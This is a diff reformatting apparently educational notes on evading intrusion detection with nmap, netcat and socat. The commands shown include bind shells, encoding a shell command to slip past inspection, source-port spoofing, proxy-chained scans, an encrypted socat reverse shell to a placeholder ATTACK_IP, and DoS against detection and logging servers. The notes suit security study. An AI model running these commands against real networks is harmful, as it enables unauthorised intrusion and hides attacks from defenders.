@@ -1,3 +1,5 @@
+# IDS/IPS Evasion
+
 ### Tools: nmap, netcat/socat
 
 # EVASION VIA PROTOCOL MANIPULATION
@@ -12,19 +14,27 @@
 
 ## 1st technique example
 
-#### 1) nc -lvnp 25 (Gives the imp[ression that it is a usual TCP connection with an SMTP server)
+#### 1) 
+
+    nc -lvnp 25 (Gives the imp[ression that it is a usual TCP connection with an SMTP server)
 
 #### Counter: Deep Packet Inspection (DPI)
 
-#### 2) nc -ulvnp 162 (UDP Connection)
+#### 2) 
+
+    nc -ulvnp 162 (UDP Connection)
 
 #### Counter: DPI
 
 # 2nd Technique example
 
-#### 1) nmap -sS -Pn -g 80 -F TARGET_IP (HTTP Server spoof)
+#### 1) 
 
-#### 2) nmap -sU -Pn -g 53 -F TARGET_IP (DNS Server spoof)
+    nmap -sS -Pn -g 80 -F TARGET_IP (HTTP Server spoof)
+
+#### 2) 
+
+    nmap -sU -Pn -g 53 -F TARGET_IP (DNS Server spoof)
 
 #### 3) Can be used with netcat as well
 
@@ -58,15 +68,23 @@
 
 ### 1) Encode to Base64 format
 
-#### 1: cat input.txt
+#### 1: 
 
-#### 2: nc -lvnp 1234 -e /bin/bash
+    cat input.txt
 
-#### 3: base64 input.txt
+#### 2: 
+
+    nc -lvnp 1234 -e /bin/bash
+
+#### 3: 
+
+    base64 input.txt
 
 ### 2) URL Encoding
 
-#### urlencode nc -lvnp 1234 -e /bin/bash
+#### 
+
+    urlencode nc -lvnp 1234 -e /bin/bash
 
 ### 3) Escaped Unicode
 
@@ -90,13 +108,21 @@
 
 ### 3) Connect to the attacker's machine
 
-#### 1) openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.example.gr/O=example COM/C=GR' -nodes -keyout gr-reverse.key -out gr-reverse.crt
+#### 1) 
 
-#### 2) cat gr-reverse.key gr-reverse.crt > gr-reverse.pem
+    openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.example.gr/O=example COM/C=GR' -nodes -keyout gr-reverse.key -out gr-reverse.crt
 
-#### 3) socat -d -d OPENSSL-LISTEN:4443,cert=gr-reverse.pem,verify=0,fork STDOUT
+#### 2) 
 
-#### 4) Victim: socat OPENSSL:ATTACK_IP:4443,verify=0 EXEC:/bin/bash
+    cat gr-reverse.key gr-reverse.crt > gr-reverse.pem
+
+#### 3) 
+
+    socat -d -d OPENSSL-LISTEN:4443,cert=gr-reverse.pem,verify=0,fork STDOUT
+
+#### 4) Victim: 
+
+    socat OPENSSL:ATTACK_IP:4443,verify=0 EXEC:/bin/bash
 
 ## 3rd Technique example
 
@@ -132,13 +158,15 @@
 
 ### Example:
 
-#### nmap -sS HTTP://PROXY_HOST:8080,SOCKS4://PROXY_HOST2:4153 TARGET_IP
+#### 
+
+    nmap -sS HTTP://PROXY_HOST:8080,SOCKS4://PROXY_HOST2:4153 TARGET_IP
 
 # EVASION VIA TACTICAL DENIAL OF SERVICE (DoS)
 
 ### 1) Launch DoS against IDS/IPS
 
-### 2) Laucnh DoS against logging server
+### 2) Launch DoS against logging server
 
 ### 3) Create huge amount of benign traffic
 
